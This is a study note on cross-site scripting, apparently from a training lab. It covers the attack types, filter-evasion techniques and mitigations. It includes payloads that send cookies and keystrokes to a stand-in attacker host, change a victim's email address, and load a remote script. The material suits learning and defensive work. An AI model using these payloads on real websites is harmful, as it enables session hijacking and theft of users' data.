# Cross-Site Scripting (XSS)

- Overview

XSS is a security vulnerability where malicious JavaScript code is injected into a website and executed in a user's browser. This allows attackers to access session tokens, manipulate content, or perform actions on behalf of users.

## XSS Payloads and Their Intentions

- Proof of Concept

Simple payload to display an alert, confirming XSS is possible:

```
<script>alert('XSS');</script>
```

- Session Stealing

Sends cookies to an attacker-controlled URL, allowing them to hijack sessions:

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

- Key Logger

Captures keystrokes and sends them to the attacker:

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>
```

- Business Logic Manipulation

Executes site-specific JavaScript functions, like changing an email address:

```
<script>user.changeEmail('attacker@hacker.thm');</script>
```

## Types of XSS Attacks

- Reflected XSS

Occurs when data is reflected back to the user directly from a request. Attackers trick users into clicking a link with a malicious payload in the URL.

Example:

```
https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>
```

- Stored XSS

Malicious scripts are saved on the server, often in a database (e.g., in comments). Every visitor to the affected page executes the script.

Potential Impact: Stolen session cookies, user redirection, and manipulation of user actions.

- DOM-Based XSS

Code executes based on client-side DOM manipulation, without server involvement. This typically happens with elements like window.location.hash that can be altered by the attacker.
Example Scenario:

If window.location.hash is used without sanitization, an attacker can inject JavaScript directly into the webpage.

- Blind XSS

Payloads are stored, but the attacker doesn’t immediately see the result. This is often used in contact forms or support tickets, where an unsuspecting staff member may later execute the malicious script.

Testing: Blind XSS can be monitored using HTTP loggers like XSS Hunter.

## Perfecting XSS Payloads

Crafting XSS payloads often requires testing and adapting to bypass filters. Techniques include:

- Using alternative encoding for characters.
- Splitting strings or injecting code in stages to bypass filters.
- Bypassing filters using obfuscation techniques to avoid detection.

## Mitigation

To prevent XSS:

- Sanitize inputs and encode outputs.
- Use Content Security Policy (CSP) headers to restrict sources of executable scripts.
- Validate user inputs rigorously, especially for fields that allow HTML or JavaScript input.
